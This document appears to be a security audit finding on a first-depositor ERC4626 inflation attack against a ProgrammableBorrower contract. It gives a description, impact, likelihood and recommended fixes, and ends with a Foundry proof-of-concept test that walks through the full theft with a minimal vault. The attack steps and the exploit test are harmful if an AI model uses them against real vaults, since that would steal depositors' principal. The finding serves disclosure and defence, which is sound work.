### Title
ERC4626 first-depositor inflation steals programmable-borrower principal - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower` accepts an arbitrary ERC4626 vault after checking only `asset()` equality, then deposits all borrower-held principal without enforcing a minimum share output. [1](#0-0) [2](#0-1)  An unprivileged depositor in that external vault can execute a first-depositor donation attack so the programmable borrower receives zero shares for its entire deposit, after which the attacker redeems the vault’s sole share and steals the credit pool’s principal.

### Finding Description
During the buffer phase before the first epoch, the attacker deposits `1` underlying unit into an empty configured ERC4626 vault and donates at least the programmable borrower’s expected principal `P`, leaving the attacker with the vault’s only share. [3](#0-2)  When the honest manager calls `IdleCDOEpochVariant.startEpoch`, the CDO transfers its underlying balance to the programmable borrower and calls `onStartEpoch`. [4](#0-3)  `onStartEpoch` snapshots the pre-deposit cash as `epochStartVaultAssets` and calls `_depositToVault` for the full balance. [5](#0-4)  With `totalSupply == 1` and `totalAssets >= P + 1`, a standard proportional ERC4626 vault mints `P * 1 / totalAssets == 0` shares, and `_depositToVault` accepts that zero-share result without a slippage or nonzero-share check. [2](#0-1) 

The attacker then redeems their single share for the donated assets plus the borrower’s deposited `P`. [3](#0-2)  `ProgrammableBorrower` subsequently values its position through `convertToAssets`, so its ledger drops from the recorded `epochStartVaultAssets` to zero while the CDO still holds principal-denominated strategy tokens. [6](#0-5)  At the next stop containing a withdrawal obligation, `onStopEpoch` returns success when the shortfall exceeds the remaining vault value, but the following borrower `transferFrom` fails because the assets were already stolen, forcing `_handleBorrowerDefault`. [7](#0-6) [8](#0-7) [9](#0-8) 

### Impact Explanation
The attacker can steal up to the entire first programmable-borrower vault deposit, bounded only by the configured credit pool limit. [5](#0-4)  The theft breaks pool solvency: the CDO keeps strategy-token principal on its books while the external vault shares backing that principal are worthless or nonexistent. [6](#0-5)  Subsequent withdrawal funding cannot be satisfied, resulting in borrower default and losses that must ultimately be absorbed through the recovery waterfall. [10](#0-9) [11](#0-10) 

### Likelihood Explanation
The attack requires an empty or effectively empty external ERC4626 vault whose total assets can be inflated before the first `ProgrammableBorrower` deposit. [1](#0-0)  No privileged role is needed because the attacker interacts only as an ordinary depositor in the configured ERC4626 vault; the honest manager’s `startEpoch` transaction completes the theft setup. [12](#0-11) [4](#0-3)  The existing asset check does not validate share supply, historical liquidity, share-price integrity, minimum minted shares, or discrepancy between deposited assets and received claim value. [13](#0-12) 

### Recommendation
Require the configured vault to satisfy operational trust criteria beyond matching `asset()`, including a minimum existing share supply and independently verified liquidity. [1](#0-0)  For every deposit, compute expected shares with `previewDeposit`, enforce a minimum accepted share amount, and revert when `deposit` returns zero or materially fewer shares than expected. [2](#0-1)  Alternatively, atomically seed and irrevocably reserve an initial vault position during deployment before any public depositor can establish the first share. [14](#0-13)

/// Minimal proportional-share ERC4626 analogue used to reproduce first-deposit inflation.
contract InflatableVault is ERC20 {
  ERC20 public immutable assetToken;

  constructor(ERC20 asset_) ERC20("vault share", "vSHARE") {
    assetToken = asset_;
  }

  function asset() external view returns (address) {
    return address(assetToken);
  }

  function totalAssets() public view returns (uint256) {
    return assetToken.balanceOf(address(this));
  }

  function convertToAssets(uint256 shares) public view returns (uint256) {
    uint256 supply = totalSupply();
    return supply == 0 ? shares : shares * totalAssets() / supply;
  }

  function convertToShares(uint256 assets) public view returns (uint256) {
    uint256 supply = totalSupply();
    uint256 managed = totalAssets();
    return supply == 0 || managed == 0 ? assets : assets * supply / managed;
  }

  function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
    shares = convertToShares(assets);
    assetToken.transferFrom(msg.sender, address(this), assets);
    _mint(receiver, shares);
  }

  function withdraw(uint256 assets, address receiver, address owner)
    external
    returns (uint256 shares)
  {
    shares = convertToShares(assets) + 1;
    if (msg.sender != owner) _spendAllowance(owner, msg.sender, shares);
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }

  function redeem(uint256 shares, address receiver, address owner)
    external
    returns (uint256 assets)
  {
    assets = convertToAssets(shares);
    if (msg.sender != owner) _spendAllowance(owner, msg.sender, shares);
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }
}

contract ProgrammableBorrowerFirstDepositTest is Test {
  uint256 internal constant PRINCIPAL = 10_000e6;

  function testFirstDepositorStealsProgrammablePrincipal() external {
    vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));

    Asset usdc = new Asset();
    InflatableVault vault = new InflatableVault(usdc);
    FakeCDO cdo = new FakeCDO(address(usdc));
    address attacker = makeAddr("attacker");

    ProgrammableBorrower implementation = new ProgrammableBorrower();
    TransparentUpgradeableProxy proxy = new TransparentUpgradeableProxy(
      address(implementation),
      address(this),
      abi.encodeWithSelector(
        ProgrammableBorrower.initialize.selector,
        address(vault),
        address(cdo),
        address(this),
        makeAddr("manager"),
        makeAddr("realBorrower"),
        0
      )
    );
    ProgrammableBorrower borrower = ProgrammableBorrower(address(proxy));

    // Attacker owns the only vault share, then inflates its redemption value.
    usdc.mint(attacker, PRINCIPAL + 1);
    vm.startPrank(attacker);
    usdc.approve(address(vault), 1);
    vault.deposit(1, attacker);
    usdc.transfer(address(vault), PRINCIPAL);
    vm.stopPrank();

    // The honest CDO sends principal to the programmable borrower before startEpoch.
    usdc.mint(address(borrower), PRINCIPAL);
    vm.prank(address(cdo));
    borrower.onStartEpoch(0);

    assertEq(vault.balanceOf(address(borrower)), 0, "deposit minted zero shares");
    assertEq(borrower.totalUnderlying(), 0, "borrower has no backing");

    // The sole attacker share redeems the donation plus the pool's principal.
    vm.prank(attacker);
    vault.redeem(1, attacker, attacker);

    assertEq(usdc.balanceOf(attacker), 2 * PRINCIPAL + 1, "attacker profit is PRINCIPAL");
  }
}
